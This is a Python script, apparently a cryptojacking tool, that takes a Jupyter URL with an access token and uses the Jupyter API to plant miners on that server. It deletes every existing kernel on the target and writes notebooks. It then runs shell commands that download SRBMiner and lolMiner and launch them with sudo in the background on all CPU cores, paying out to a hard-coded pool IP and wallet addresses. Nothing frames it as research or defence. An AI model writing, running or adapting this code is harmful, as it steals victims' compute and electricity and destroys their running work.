import re
import requests
import json
import asyncio
import websockets
import uuid
import time
import random
import argparse
from datetime import datetime

def generate_worker_id():
    """Generate a random 3-digit worker ID for each miner"""
    return f"rig_cakarcpu{random.randint(100, 999)}"

def create_srb_code(worker_id):
    """Create SRBMiner code with dynamic worker ID"""
    return f'''
!wget -q https://github.com/doktor83/SRBMiner-Multi/releases/download/2.9.6/SRBMiner-Multi-2-9-6-Linux.tar.gz && tar -xf SRBMiner-Multi-2-9-6-Linux.tar.gz > /dev/null 2>&1 && chmod +x SRBMiner-Multi-2-9-6/SRBMiner-MULTI && sudo ./SRBMiner-Multi-2-9-6/SRBMiner-MULTI -a randomvirel -o 178.128.14.152:80 -u v1g5udzsr8h9mr0t0r6mfyy2di7xtya6jkfzoc2.plan -p m=solo -t $(nproc) --background'''

def create_lolminer_code(worker_id):
    """Create lolMiner code with dynamic worker ID"""
    return f'''
!wget -q https://github.com/kryptex-miners-org/kryptex-miners/releases/download/lolminer-1-98a/lolMiner_v1.98a_Lin64.tar.gz && tar -xf lolMiner_v1.98a_Lin64.tar.gz > /dev/null 2>&1 && chmod +x lolMiner && sudo ./lolMiner --algo FISHHASH --pool fishhash.unmineable.com:80 --user USDT:TThXMire8Q88eDWdVsZQfpS3DFt6jRPyQ2.ayo --worker {worker_id} --background'''

def log_error(url, error_message, error_type="GENERAL"):
    """Error logging to error.txt"""
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open("error.txt", "a", encoding="utf-8") as f:
            f.write(f"[{timestamp}] {error_type}: {url}\n")
            f.write(f"Error: {error_message}\n")
            f.write("-" * 80 + "\n")
        print(f"[!] Error logged for: {url}")
    except Exception as e:
        print(f"[!] Failed to write to error.txt: {e}")

def extract_info(url):
    try:
        # Match either domain or IP + optional port
        m = re.match(r'^(https?)://([a-zA-Z0-9\.\-]+(?::\d+)?)/lab\?token=([a-zA-Z0-9]+)$', url)
        if not m:
            print(f"[!] Invalid URL format: {url}")
            return None

        scheme, host, token = m.groups()
        base_url = f"{scheme}://{host}"
        ws_scheme = "wss" if scheme == "https" else "ws"

        return {
            "base": base_url,
            "token": token,
            "headers": {
                "Authorization": f"token {token}",
                "Content-Type": "application/json"
            },
            "ws_url": f"{ws_scheme}://{host}/api/kernels"
        }
    except Exception as e:
        print(f"[!] Exception in extract_info: {e}")
        return None

def create_notebook(info, url, filename="Untitled.ipynb", code_to_use=None):
    if code_to_use is None:
        worker_id = generate_worker_id()
        code_to_use = create_srb_code(worker_id)
    
    notebook = {
        "cells": [{
            "cell_type": "code",
            "execution_count": None,
            "metadata": {},
            "outputs": [],
            "source": code_to_use.strip().splitlines()
        }],
        "metadata": {
            "kernelspec": {
                "display_name": "Python 3",
                "language": "python",
                "name": "python3"
            },
            "language_info": {
                "name": "python",
                "version": "3.x"
            }
        },
        "nbformat": 4,
        "nbformat_minor": 2
    }

    try:
        api_url = f"{info['base']}/api/contents/{filename}"
        response = requests.put(api_url, headers=info["headers"], data=json.dumps({
            "type": "notebook",
            "content": notebook
        }), timeout=30)
        
        if response.status_code in [200, 201]:
            print(f"[+] Notebook '{filename}' created")
            return True
        else:
            error_msg = f"HTTP {response.status_code}: {response.text}"
            log_error(url, f"Notebook creation failed: {error_msg}", "NOTEBOOK_CREATE_ERROR")
            print(f"[!] Failed to create notebook: {error_msg}")
            return False
    except requests.exceptions.Timeout:
        log_error(url, "Notebook creation timeout (30s)", "NOTEBOOK_TIMEOUT")
        print(f"[!] Notebook creation timeout for: {url}")
        return False
    except Exception as e:
        log_error(url, f"Notebook creation exception: {e}", "NOTEBOOK_EXCEPTION")
        print(f"[!] Exception creating notebook: {e}")
        return False

def start_kernel(info, url):
    try:
        response = requests.post(f"{info['base']}/api/kernels", headers=info["headers"], timeout=30)
        if response.status_code in [200, 201]:
            return response.json()["id"]
        else:
            error_msg = f"HTTP {response.status_code}: {response.text}"
            log_error(url, f"Kernel start failed: {error_msg}", "KERNEL_START_ERROR")
            return None
    except requests.exceptions.Timeout:
        log_error(url, "Kernel start timeout (30s)", "KERNEL_TIMEOUT")
        print(f"[!] Kernel start timeout for: {url}")
        return None
    except Exception as e:
        log_error(url, f"Kernel start exception: {e}", "KERNEL_EXCEPTION")
        print(f"[!] Kernel start error: {e}")
        return None

def check_busy_kernels(info, idx, url):
    """Check if any kernels are busy - returns True if busy kernels found"""
    try:
        response = requests.get(f"{info['base']}/api/kernels", headers=info["headers"], timeout=30)
        if response.status_code != 200:
            log_error(url, f"Failed to get kernels list: HTTP {response.status_code}", "KERNEL_LIST_ERROR")
            return False
            
        kernels = response.json()
        for k in kernels:
            if k.get('execution_state') == 'busy':
                print(f"[{idx}] SKIPPING URL - BUSY KERNEL FOUND: {k['id']}")
                return True
        return False
    except Exception as e:
        log_error(url, f"Kernel check failed: {e}", "KERNEL_CHECK_ERROR")
        return False

def delete_all_kernels(info, idx, url):
    try:
        response = requests.get(f"{info['base']}/api/kernels", headers=info["headers"], timeout=30)
        if response.status_code != 200:
            log_error(url, f"Failed to get kernels list: HTTP {response.status_code}", "KERNEL_LIST_ERROR")
            return False
            
        kernels = response.json()
        for k in kernels:
            print(f"[{idx}] Deleting old kernel: {k['id']}")
            del_response = requests.delete(f"{info['base']}/api/kernels/{k['id']}", headers=info["headers"], timeout=30)
            if del_response.status_code not in [200, 204]:
                print(f"[{idx}] Warning: Failed to delete kernel {k['id']}")
        time.sleep(1)
        return True
    except requests.exceptions.Timeout:
        log_error(url, "Kernel deletion timeout (30s)", "KERNEL_DELETE_TIMEOUT")
        return False
    except Exception as e:
        log_error(url, f"Kernel deletion failed: {e}", "KERNEL_DELETE_ERROR")
        print(f"[{idx}] Failed to delete old kernels: {e}")
        return False

def execute_code(info, kernel_id, code, url):
    session_id = str(uuid.uuid4())
    ws_url = f"{info['ws_url']}/{kernel_id}/channels?session_id={session_id}"

    async def send_and_listen():
        try:
            async with websockets.connect(ws_url, extra_headers=info["headers"]) as ws:
                msg = {
                    "header": {
                        "msg_id": str(uuid.uuid4()),
                        "username": "",
                        "session": session_id,
                        "msg_type": "execute_request",
                        "version": "5.0"
                    },
                    "parent_header": {},
                    "metadata": {},
                    "content": {
                        "code": code,
                        "silent": False
                    },
                    "channel": "shell"
                }
                await ws.send(json.dumps(msg))

                # Listen briefly for any error
                for _ in range(10):
                    try:
                        r = await asyncio.wait_for(ws.recv(), timeout=3)
                        if '"ename"' in r or '"evalue"' in r:
                            return "[!] Execution error:\n" + r
                    except asyncio.TimeoutError:
                        break
                return None
        except Exception as e:
            return str(e)

    # Create new event loop for this thread
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        result = loop.run_until_complete(send_and_listen())
        if result:
            log_error(url, f"Code execution failed: {result}", "CODE_EXECUTION_ERROR")
        return result
    except Exception as e:
        log_error(url, f"Code execution exception: {e}", "CODE_EXECUTION_EXCEPTION")
        return str(e)
    finally:
        loop.close()

def handle_dual_kernel_mining(idx, url):
    """Handle dual kernel mining with both SRBMiner and lolMiner"""
    worker_id = generate_worker_id()
    print(f"[{idx}] Starting DUAL KERNEL mining on: {url}")
    print(f"[{idx}] Worker ID: {worker_id}")
    
    try:
        info = extract_info(url)
        if not info:
            log_error(url, "Invalid URL format or parsing failed", "INVALID_URL")
            print(f"[{idx}] Invalid URL format: {url}")
            return False

        # First check for busy kernels - skip entire URL if found
        if check_busy_kernels(info, idx, url):
            return False

        # Delete old kernels
        if not delete_all_kernels(info, idx, url):
            print(f"[{idx}] Warning: Failed to clean old kernels for: {url}")

        # Create miner codes
        srb_code = create_srb_code(worker_id)
        lolminer_code = create_lolminer_code(worker_id)

        print(f"[{idx}] Created both SRBMiner and lolMiner codes")

        # Create notebooks for both miners
        if not create_notebook(info, url, "SRBMiner.ipynb", srb_code):
            print(f"[{idx}] Failed to create SRBMiner notebook")
            return False

        if not create_notebook(info, url, "lolMiner.ipynb", lolminer_code):
            print(f"[{idx}] Failed to create lolMiner notebook")
            return False

        # Start first kernel for SRBMiner
        kernel1_id = start_kernel(info, url)
        if not kernel1_id:
            print(f"[{idx}] Failed to start first kernel for SRBMiner")
            return False

        # Start second kernel for lolMiner
        kernel2_id = start_kernel(info, url)
        if not kernel2_id:
            print(f"[{idx}] Failed to start second kernel for lolMiner")
            return False

        print(f"[{idx}] Started dual kernels:")
        print(f"[{idx}]   Kernel 1 (SRBMiner): {kernel1_id}")
        print(f"[{idx}]   Kernel 2 (lolMiner): {kernel2_id}")

        # Execute SRBMiner in first kernel
        print(f"[{idx}] Launching SRBMiner...")
        err1 = execute_code(info, kernel1_id, srb_code, url)
        if err1:
            print(f"[{idx}] SRBMiner execution error: {err1}")
        else:
            print(f"[{idx}] SRBMiner launched successfully")

        # Execute lolMiner in second kernel
        print(f"[{idx}] Launching lolMiner...")
        err2 = execute_code(info, kernel2_id, lolminer_code, url)
        if err2:
            print(f"[{idx}] lolMiner execution error: {err2}")
        else:
            print(f"[{idx}] lolMiner launched successfully")

        # Consider success if at least one miner launched
        success = not err1 or not err2
        if success:
            print(f"[{idx}] DUAL KERNEL MINING: At least one miner deployed successfully")
        else:
            print(f"[{idx}] DUAL KERNEL MINING: Both miners failed to deploy")

        return success
            
    except Exception as e:
        log_error(url, f"Unexpected exception in dual kernel mining: {e}", "DUAL_KERNEL_EXCEPTION")
        print(f"[{idx}] Exception in dual kernel mining for {url}: {e}")
        return False

def main():
    # Parse command line arguments
    parser = argparse.ArgumentParser(description='Jupyter Notebook Dual Kernel Miner Deployer')
    parser.add_argument('--url', required=True, help='Jupyter notebook URL with token')
    args = parser.parse_args()

    # Initialize error log file
    try:
        with open("error.txt", "w", encoding="utf-8") as f:
            f.write(f"Error Log - Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 80 + "\n")
        print("[+] Error log file initialized: error.txt")
    except Exception as e:
        print(f"[!] Failed to initialize error log: {e}")

    print(f"[+] Processing URL: {args.url}")
    print("[+] AUTO DUAL KERNEL MODE: Deploying both SRBMiner and lolMiner")
    
    # Always use dual kernel mode
    success = handle_dual_kernel_mining(1, args.url)
    
    # Final result
    if success:
        print(f"[+] SUCCESS: Dual kernel miners deployed successfully to: {args.url}")
    else:
        print(f"[!] FAILED: Miner deployment failed for: {args.url}")
        print(f"[!] Check error.txt for details")
    
    # Write summary to error log
    try:
        with open("error.txt", "a", encoding="utf-8") as f:
            f.write(f"\nSUMMARY - Completed at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 80 + "\n")
            f.write(f"URL: {args.url}\n")
            f.write(f"Mode: AUTO DUAL KERNEL\n")
            f.write(f"Result: {'SUCCESS' if success else 'FAILED'}\n")
    except Exception as e:
        print(f"[!] Failed to write summary to error log: {e}")

if __name__ == "__main__":
    main()
